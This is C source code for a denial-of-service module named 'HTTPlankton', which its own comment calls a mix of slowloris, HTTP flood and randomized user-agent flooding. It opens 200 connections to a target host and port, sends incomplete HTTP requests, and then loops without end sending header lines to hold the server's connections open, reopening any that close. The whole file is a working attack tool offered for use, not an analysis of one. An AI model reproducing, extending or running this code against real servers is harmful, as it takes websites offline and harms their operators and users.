#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

/* HTTP DDoS script developed as a mix of slowloris,
    http flood, HTTP Randomized User-Agent Flood */
#include <dict.h>

#define CONNECTIONS 200
#define SLEEP_TIME 10 // seconds delay

int sockets[CONNECTIONS];

void setup_connection(int index, char *target_ip, int target_port)
{
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    server.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Error during socket creation");
#endif
        return;
    }

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Connection error");
#endif
        close(sock);
        return;
    }

    char request[1024];
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept-language: en-US,en,q=0.5\r\n",
             target_ip,
             get_random_user_agent());

    send(sock, request, strlen(request), 0);
    sockets[index] = sock;
}

void start_httplankton_attack(char *target_ip, int target_port, int duration)
{
#ifdef DEBUG
    printf("[HTTPlankton] Starting HTTPlankton attack %s:%d\n", target_ip, target_port);
#endif

    for (int i = 0; i < CONNECTIONS; i++)
    {
        setup_connection(i, target_ip, target_port);
    }

    while (1) //TODO attack stop after duration expired
    {
        for (int i = 0; i < CONNECTIONS; i++)
        {
            if (send(sockets[i], "X-a: b\r\n", 9, 0) < 0)
            {
                close(sockets[i]);
                setup_connection(i, target_ip, target_port);
            }
        }

#ifdef DEBUG
        printf("[HTTPlankton] Still active connections...\n");
#endif
        sleep(SLEEP_TIME);
    }

    return;
}
